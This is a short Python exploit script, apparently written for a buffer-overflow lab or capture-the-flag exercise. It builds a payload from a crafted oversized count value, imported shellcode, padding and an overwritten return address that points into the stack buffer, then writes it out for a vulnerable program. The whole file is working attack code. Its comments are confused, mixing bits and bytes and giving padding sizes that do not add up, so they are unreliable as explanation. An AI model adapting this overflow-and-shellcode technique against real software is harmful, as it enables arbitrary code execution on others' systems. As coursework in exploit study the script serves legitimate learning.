#!/usr/bin/env python3

import sys

from shellcode import shellcode

rbp = 0x7ffffff6b4d0
buffer_adrress = 0x7ffffff6b450

offset = (rbp-buffer_adrress +8) 
count = 0x4000000000000010       #buffer is 56 bytes so need to fill it with shellcode + 3 bytes of padding 

payload  = count.to_bytes(8, 'little')
payload += shellcode                              # 53 bytes
payload += b'A' * (offset-len(shellcode))  # 43 bytes
payload += buffer_adrress.to_bytes(8, 'little')             # 8 bytes

sys.stdout.buffer.write(payload)

#64 bits is 8 bytes I want a 56 bit buffer 0x40 = 64 in hex 
#10000000000000040 #this is the value we want for 
#value we want for count = 0x4000000000000010
#this makes a 64 bit buffer so put in the 53 bits of the shellcode and then add padding to get to the return address 
